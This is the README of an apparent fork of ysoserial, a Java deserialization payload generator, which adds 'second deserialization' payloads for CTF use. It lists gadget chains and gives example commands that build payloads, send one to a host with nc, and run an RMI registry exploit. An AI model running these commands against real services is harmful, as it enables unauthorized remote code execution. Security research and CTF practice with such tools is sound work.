
# ysoserial

[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

添加了二次反序列化内容，更适合中国宝宝CTF体制

![logo](ysoserial.png)

## Description

家人们谁懂啊，居然没人做二次反序列化的，我先写三个payload为敬

目前SecObjRMICon，SecObjBA和SecObjROME可用，后续会添加C3P0

参考来自

http://tttang.com/archive/1701/

[https://github.com/Y4tacker/JavaSec/blob/main/其他/Java二次反序列化/Java触发二次反序列化的点.md](https://github.com/Y4tacker/JavaSec/blob/main/其他/Java二次反序列化/Java触发二次反序列化的点.md)

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
java -jar ysoserial-Second-0.0.1-all.jar
Y SO SERIAL?
Add some payload by J1an
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
Usage: java -jar ysoserial-[version]-all.jar secobjxxx '原payload:command'
  Available payload types:
七月 23, 2023 4:06:58 下午 org.reflections.Reflections scan
信息: Reflections took 82 ms to scan 1 urls, producing 18 keys and 165 values
     Payload             Authors                                Dependencies                                                                                                          
     -------             -------                                ------------                                                                                                          
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                        
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                                             
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                             
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                           
     Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                         
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                 
     CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                               
     CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                              
     CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                               
     CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                              
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                               
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                               
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                               
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                                              
     Groovy1             @frohoff                               groovy:2.3.9                                                                                                          
     Hibernate1          @mbechler                                                                                                                                                    
     Hibernate2          @mbechler                                                                                                                                                    
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler                                                                                                                                                    
     JRMPListener        @mbechler                                                                                                                                                    
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff                                                                                                                                                     
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                               
     MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                              
     MozillaRhino2       @_tint0                                js:1.7R2                                                                                                              
     Myfaces1            @mbechler                                                                                                                                                    
     Myfaces2            @mbechler                                                                                                                                                    
     ROME                @mbechler                              rome:1.0                                                                                                              
     SecObjBA            @J1an                                  jackson                                                                                                               
     SecObjRMICon        @J1an                                  commons-collections:3.1                                                                                               
     SecObjROME          @J1an                                  rome:1.0                                                                                                              
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                 
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                             
     URLDNS              @gebl                                                                                                                                                        
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                            
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4             
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)

Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
